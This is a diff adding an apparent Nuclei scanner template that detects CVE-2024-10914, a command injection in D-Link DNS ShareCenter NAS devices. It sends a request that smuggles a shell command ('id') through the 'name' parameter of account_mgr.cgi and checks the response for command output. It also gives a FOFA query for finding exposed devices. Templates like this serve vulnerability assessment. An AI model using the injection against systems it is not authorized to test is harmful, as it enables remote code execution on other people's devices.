@@ -1,0 +1,30 @@
+id: d-link-nas-account-mgr-rce
+info:
+  name: D-Link DNS ShareCenter - Command Injection and Backdoor Account
+  author: qwtd
+  severity: critical
+  metadata:
+    cve-id: CVE-2024-10914
+    verified: true
+    vendor: dlink
+    product: "dns-320l_firmware"
+    fofa-query: "app=\"D_Link-DNS-ShareCenter\""
+    max-request: 1
+  tags: D-Link-DNS
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;id;%27"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+
+      - type: status
+        status:
+          - 200
+# digest: 490a0046304402203982bd27134560aeb8fa52d09e98ad42fbbbcaf319d257593aed74bef082be5a02202be13f559cdcb1d20876067e3f5b91f3264f7c62311e31c8907fbeac7990117e:922c64590222798bb761d5b6d8e72950
